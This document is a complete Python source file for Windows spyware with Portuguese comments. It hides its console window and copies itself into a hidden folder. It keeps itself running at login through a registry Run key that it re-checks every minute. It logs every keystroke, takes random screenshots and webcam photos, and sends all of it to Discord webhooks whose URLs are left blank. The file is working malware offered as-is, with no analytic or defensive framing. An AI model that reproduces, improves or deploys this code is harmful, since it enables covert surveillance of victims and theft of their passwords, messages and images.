import sys
import os
import time
import random
import string
import requests
import pythoncom
import win32console
import win32gui
import winreg
import pyautogui
import keyboard
import cv2
import io
import shutil
from threading import Thread
from PIL import Image

# ------------------- CONFIGURAÇÕES DE WEBHOOK -------------------
webhook_keys_url = ""  # URL WEBHOOK 
webhook_media_url = ""  # URL WEBHOOK  

# ------------------- CONFIGURAÇÕES DE TEMPO -------------------
interval = 120 
screenshot_interval = random.randint(120, 180) 
last_screenshot_time = 0
captured_keys = []
start_time = time.time()

# ------------------- FUNÇÕES DE INICIALIZAÇÃO -------------------
def add_startup(file_path=None):
    try:
        if file_path is None:
            fp = os.path.dirname(os.path.realpath(__file__))
            file_name = sys.argv[0].split('\\')[-1]
            file_path = fp + '\\' + file_name
        key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_val, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key2change, 'Im_not_a_keylogger', 0, winreg.REG_SZ, file_path)
    except Exception as e:
        print(f"Erro ao adicionar ao startup: {e}")

def hide():
    try:
        win = win32console.GetConsoleWindow()
        win32gui.ShowWindow(win, 0)
    except Exception as e:
        print(f"Erro ao ocultar a janela: {e}")

def copy_to_hidden_folder():
    try:
        destination_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'SystemHiddenFolder')
        if not os.path.exists(destination_dir):
            os.makedirs(destination_dir)
        current_file = sys.argv[0]
        new_file_path = os.path.join(destination_dir, os.path.basename(current_file))
        shutil.copy2(current_file, new_file_path)       
        os.system(f'attrib +h "{new_file_path}"')

        print(f'Arquivo copiado e oculto em: {new_file_path}')

        # Adiciona a cópia ao startup
        add_startup(new_file_path)
    except Exception as e:
        print(f"Erro ao copiar o arquivo para a pasta oculta: {e}")

def verify_startup():
    while True:
        try:
            key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
            key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_val, 0, winreg.KEY_ALL_ACCESS)
            value, regtype = winreg.QueryValueEx(key2change, 'Im_not_a_keylogger')

            # Se o valor não corresponder ao caminho esperado, restaura
            destination_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'SystemHiddenFolder')
            expected_path = os.path.join(destination_dir, os.path.basename(sys.argv[0]))
            if value != expected_path:
                add_startup(expected_path)
        except FileNotFoundError:
            # Caso a entrada não exista, recria-a
            destination_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'SystemHiddenFolder')
            expected_path = os.path.join(destination_dir, os.path.basename(sys.argv[0]))
            add_startup(expected_path)
        except Exception as e:
            print(f"Erro ao verificar o registro do startup: {e}")

        time.sleep(60)  # Verifica a cada 60 segundos

# ------------------- FUNÇÕES DE CAPTURA DE TELA E CÂMERA -------------------
def screenshot():
    global last_screenshot_time
    try:
        screenshot = pyautogui.screenshot()  
        screenshot_buffer = io.BytesIO()  
        screenshot.save(screenshot_buffer, format='PNG')  
        screenshot_buffer.seek(0)  
        post_to_discord_media_file(screenshot_buffer, "screenshot.png")  
        last_screenshot_time = time.time()
    except Exception as e:
        print(f"Erro ao tirar screenshot: {e}")

def capture_camera():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            raise Exception("Câmera não disponível ou já em uso")
        ret, frame = cap.read()
        if ret:
            is_success, buffer = cv2.imencode(".png", frame)  # Codifica a imagem capturada em PNG
            if is_success:
                post_to_discord_media_file(io.BytesIO(buffer), "camera.png")  # Envia para o Discord
        else:
            print("Erro ao capturar a imagem da câmera")
        cap.release()
        cv2.destroyAllWindows()
    except Exception as e:
        print(f"Erro ao capturar imagem da câmera: {e}")

# ------------------- FUNÇÕES DE ENVIO AO DISCORD -------------------
def post_to_discord_keys(file_content):
    if not file_content.strip():
        return
    try:
        response = requests.post(webhook_keys_url, json={"content": file_content})
        if response.status_code in [200, 204]:
            print("Dados de teclas enviados com sucesso para o Discord.")
        else:
            print(f"Erro ao enviar para o Discord: {response.status_code}, {response.text}")
    except Exception as e:
        print(f"Erro ao enviar para o webhook do Discord: {e}")

def post_to_discord_media_file(file_buffer, file_name):
    try:
        files = {"file": (file_name, file_buffer)}
        response = requests.post(webhook_media_url, files=files)
        if response.status_code in [200, 204]:
            print("Arquivo de mídia enviado com sucesso para o Discord.")
        else:
            print(f"Erro ao enviar o arquivo para o Discord: {response.status_code}, {response.text}")
    except Exception as e:
        print(f"Erro ao enviar o arquivo para o webhook do Discord: {e}")

# ------------------- FUNÇÕES DE CAPTURA DO TECLADO -------------------
def clean_key(key):
    special_keys = {
        'space': ' ',  # Transforma "space" em um espaço real
        'enter': '\n',  # Transforma "enter" em uma nova linha
        'backspace': '[BACKSPACE]',
        'shift': '',  # Ignora o shift, pois não representa uma tecla em si
        'ctrl': '[CTRL]',
        'alt': '[ALT]',
        'tab': '\t',  # Tabulação
    }
    return special_keys.get(key, key) 

def format_key_output(key):
    return clean_key(str(key))

def on_keyboard_event(event):
    global captured_keys, start_time, last_screenshot_time

    formatted_key = format_key_output(event.name)
    if formatted_key:  
        captured_keys.append(formatted_key)

    if len(captured_keys) >= 500 or int(time.time() - start_time) >= interval:
        if captured_keys:
            captured_text = "".join(captured_keys)  
            post_to_discord_keys(f"Teclas pressionadas: {captured_text}")
            captured_keys = []  
        start_time = time.time()

    if int(time.time() - last_screenshot_time) >= screenshot_interval:
        if random.choice([True, False]):
            screenshot()
        else:
            capture_camera()
        last_screenshot_time = time.time()

# ------------------- FUNÇÃO PRINCIPAL -------------------
def main():
    add_startup()
    hide()
    copy_to_hidden_folder()

    # Inicia a verificação de persistência em uma thread separada
    Thread(target=verify_startup, daemon=True).start()

    global start_time, last_screenshot_time
    start_time = time.time()
    last_screenshot_time = time.time()

    keyboard.on_press(lambda event: on_keyboard_event(event))

    pythoncom.PumpMessages()

# ------------------- EXECUÇÃO -------------------
if __name__ == "__main__":
    main()
